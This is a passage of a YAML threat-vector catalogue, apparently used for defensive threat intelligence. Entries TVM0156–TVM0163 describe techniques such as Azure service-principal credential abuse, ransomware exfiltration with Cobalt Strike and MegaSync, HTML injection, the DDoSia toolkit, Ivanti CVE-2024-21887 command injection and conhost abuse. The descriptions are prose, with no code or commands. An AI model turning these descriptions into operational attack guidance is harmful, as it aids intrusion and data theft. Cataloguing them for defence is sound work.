      Robust network segmentation is crucial,  limiting the lateral movement of threat
      actors. '
    criticality: Medium
    tlp: amber+strict
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0156%5D-Command-execution-with-RPC-over-SMB
  - id: TVM0157
    name: Externally controlled Azure credentials added to an Enterprise app or its
      SPN
    description: 'Threat actors may assign valid azure credentials to an Azure Enterprise
      App or its SPN (service principal). NSA writes in its advisory that the app
      was seen leveraged to access emails from the Enterprise app, but the attack
      vector could be used for many other types of leverage. '
    criticality: Medium
    tlp: clear
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0157%5D-Externally-controlled-Azure-credentials-added-to-an-Enterprise-app-or-its-SPN
  - id: TVM0158
    name: Anomalous data transfer from user devices to public network
    description: 'Anomalous data transfer refers to data transfer activity that significantly  deviates
      from normal or expected patterns within a network or system.   This anomaly
      can serve as an indicator of a potential malicious activity, as  it may suggest
      that adversaries are attempting to access or extract information  in an unusual
      or unauthorized manner. Anomalous data transfers may include, for  example,
      the transmission of large volumes of data to unusual destinations, data  transfers
      outside of regular hours or communication with unknown or unauthorized locations.  As
      an example, OceanLotus group exploited the vulnerability (CVE-2017-11882) to
      conduct targeted attacks,  sending malicious Office documents containing code
      designed to exploit it. Once the document  was opened, the code was executed
      and allowed the attackers to take control of the victim''s computer. Data exfiltration
      is done using the already opened channel with the C&C server of the adversaries.  It
      has been observed that adversaries have used various techniques to gain access
      to  sensitive information. One of the infection chains utilized by a known threat
      actor is as follows:  Adversaries initiate the infection chain by sending an
      email to the victim, containing a  download link that fetches the first-stage
      downloader. This initial downloader is responsible  for retrieving a malicious
      MSI file hosted on an attacker-controlled GitHub page. Subsequently,  this MSI
      file is downloaded and executed on the endpoint. As a consequence, a malicious
      Python-compiled  binary is introduced into the file system, which utilizes the
      Dropbox API for C2 communication.  Examination of the metadata associated with
      the dropped binary indicates that threat actors were  disguising it with legitimate
      application names linked to popular online services such as Microsoft OneDrive.   Several
      ransomware campaigns have adopted double extortion techniques where threat  actors
      both encrypt a company files and leak their data to the public. some of the
      tools used to  exfiltrate data are the followings:  - Cobalt Strike: Cobalt
      Strike beacons (Cobalt Strike covert payload) served as backdoors for the attack.
      The tool was also used for lateral movement. This was performed via actions
      such as accessing  and dumping credential hashes from LSASS, using the harvested
      passwords for further movement, sending  files to remote drives, and using Windows
      Management Instrumentation (WMI) commands to run either a  DLL or EXE copy of
      itself. Conti Ransomware employs this tool.  - MegaSync: LockBit is one of the
      ransomware variants that employs the double extortion technique.  The LockBit
      ransomware operators employ MegaSync for exfiltration, taking advantage of the
      storage  and ease of access of the tool to be able to quickly upload files from
      the affected system. '
    criticality: High
    tlp: amber
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0158%5D-Anomalous-data-transfer-from-user-devices-to-public-network
  - id: TVM0159
    name: Malicious HTML injection
    description: 'Just like cross-site scripting, an HTML injection happens when adversaries
      supplies  a payload (most often HTML code, rarely CSS) as part of untrusted
      input, and the web browser  executes it as part of the HTML of the vulnerable
      web page.  HTML injection attacks target only the client, and just like XSS
      attacks, they affect the user, not the server.  There are two major types of
      HTML injection: reflected and stored.  - Reflected HTML injection: In this attack,
      the malicious HTML code is not kept on the website  permanently but this attack
      occurs when a website reacts right away to malicious input this is  done by
      the POST and GET methods. - Stored HTML injection: In this attack, the malicious
      HTML code is permanently saved into the  web server and it gets executed each
      time a user invokes the necessary functionality.  The primary difference between
      HTML injections and XSS is the scope of capabilities of the adversaries.  Due
      to the declarative nature of HTML content, the payload can accomplish much less
      than in the case  of JavaScript code. This makes HTML injections much less likely
      to be used for phishing attacks.  This technique has been used by threat actors
      in the following cases:  ### OceanLotus Operations Through Fake Websites:  In
      2019, OceanLotus operated fake activist, news, and anti-corruption websites
      to track and attack visitors.  Despite these sites being shut down, OceanLotus
      has recently launched new attack campaigns, creating fake  news websites and
      Facebook pages. Volexity identified Vietnamese-language news websites seemingly
      compromised  but, upon inspection, found them to be OceanLotus-operated. These
      sites, displaying benign content, were designed  to profile users and distribute
      malware discreetly. The campaign targeted users in Vietnam and neighboring Southeast  Asian
      countries. The post provides a list of identified websites and advises against
      visiting them.  ### Emissary Panda hacked 100+ websites to use as “watering
      holes”:  The attackers use code embedded in compromised websites to redirect
      visitors to malicious webpages, screening their  IP addresses. If the IP address
      falls within the target range, the malicious site waits for the next page view
      to  launch an exploit. Emissary Panda also uses spear-phishing attacks. Once
      inside a network, the group focuses on Windows  network domain controllers and
      Exchange email servers, aiming to steal user credentials and move laterally
      within the network.  They exploit Internet Information Server vulnerabilities
      to inject keyloggers and backdoor malware onto Exchange servers,  allowing them
      to quickly compromise other systems within a targeted network, often within
      two hours of the initial breach. '
    criticality: High
    tlp: amber
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0159%5D-Malicious-HTML-injection
  - id: TVM0160
    name: Use of DDOSia tool
    description: 'DDoSia is a Distributed Denial of Service (DDoS) attack toolkit,
      developed  and used by the pro Russia hacktivist nationalist group NoName057(16)
      against  countries critical of the Russian invasion of Ukraine.  DDoSia was
      initially written in Python using CPU threads as a way to launch several  network
      requests at the same time. Since the first version, DDoSia relied on HTTP  protocol
      for Command & Control (C2) communication, with JSON configurations distributed  by
      the C2 server, and is available for several operating systems.  The DDoS attacks
      are organized directly via Telegram in order to bundle targets to ensure  the
      greatest possible damage. Participants are also provided with specially developed  malware
      to download, which is distributed via a ZIP archive and can be deployed at their  own
      discretion. This malware infiltrates computer systems that are already under
      control  in order to use them as additional firepower for the botnet.  This
      tool has been used by adversaries in the following attacks:  - The first victim;
      zno.testportal.com[.]ua is related to testportal.gov[.]ua, a state institution  (Ukrainian
      Center for Educational Quality Assessment) which delivers external independent
      evaluation of students. - The second domain, e-journal.iea.gov[.]ua is a online
      education platform created by the Ukrainian  government to face COVID restrictions. '
    criticality: High
    tlp: amber
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0160%5D-Use-of-DDOSia-tool
  - id: TVM0161
    name: Command injection on web components of Ivanti Connect Secure appliances
    description: 'Attackers may manage to have access to an Ivanti Connect Secure
      appliance  (that provide remote VPN access to corporate infrastructures) either
      with valid credentials or exploiting a vulnerability to bypass  authentication.    CVE-2024-21887
      is such a vulnerability that allows an attacker who has  acccess to ICS to inject
      commands on the appliance.  Attackers have exploited this vulnerability to download
      additional files,  to do reconnaissance, to capture credentials (keylogging)
      or to move  laterally to other appliances or corporate resources. '
    criticality: Severe
    tlp: clear
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0161%5D-Command-injection-on-web-components-of-Ivanti-Connect-Secure-appliances
  - id: TVM0162
    name: Abuse of web form to send spam emails
    description: 'A type of cyber attack in which adversaries exploits vulnerabilities
      in web forms  to compromise the security of a website or online system. Web
      forms are interfaces  that allow users to submit data to the web server. They
      can be registration forms,  login forms, comment forms, or any other type of
      interactive form on a web page.  There are several ways in which adversaries
      can take advantage of this type of attack, for example:  - Without security
      measures such as CAPTCHA, unauthenticated users can send malicious  messages
      with attachments through contact forms, which can pose a risk.   There are cases
      where such attacks have been used previously, as in the following case:  ###
      Adversaries Using Websites Contact Forms to Deliver IcedID Malware:  Microsoft
      has issued a warning about a distinctive cyberattack campaign exploiting contact
      forms on websites.  In this attack, malicious links are delivered to businesses
      through emails posing as legal threats. Recipients  are urged to click on a
      link to examine alleged evidence, but instead, they unwittingly download IcedID,
      a Windows-based  banking trojan designed for stealing information. IcedID is
      capable of reconnaissance, exfiltrating banking credentials,  connecting to
      remote servers for additional payload deployment (including ransomware), and
      executing hands-on-keyboard attacks. '
    criticality: High
    tlp: amber
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0162%5D-Abuse-of-web-form-to-send-spam-emails
  - id: TVM0163
    name: Conhost abuse to obfuscate command interpreters
    description: 'Adversaries may abuse utilities that allow for command execution
      to bypass security  restrictions that limit the use of command-line interpreters.
      Various Windows utilities  may be used to execute commands, possibly without
      invoking cmd. Adversaries may abuse  these features for Defense Evasion, specifically
      to perform arbitrary execution while  subverting detections and/or mitigation
      controls (such as Group Policy) that limit/prevent  the usage of cmd or file
      extensions more commonly associated with malicious payloads.  Some of the malicious
      activities related to this topic are the followings:  ### AsyncRAT loader: Obfuscation,
      DGAs, decoys and Govno:  The phishing campaign utilizing the AsyncRAT tool,
      involves targeted emails leading to the  download of a complex JavaScript file
      and execution of the AsyncRAT client. The campaign  employs anti-sandboxing
      measures, dynamic domain generation, and constantly evolving code  to evade
      detection. A decoy sample posing as an AsyncRAT client and the use of BitLaunch  for
      hosting, allowing cryptocurrency payments, add further intricacy.  '
    criticality: High
    tlp: amber
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0163%5D-Conhost-abuse-to-obfuscate-command-interpreters
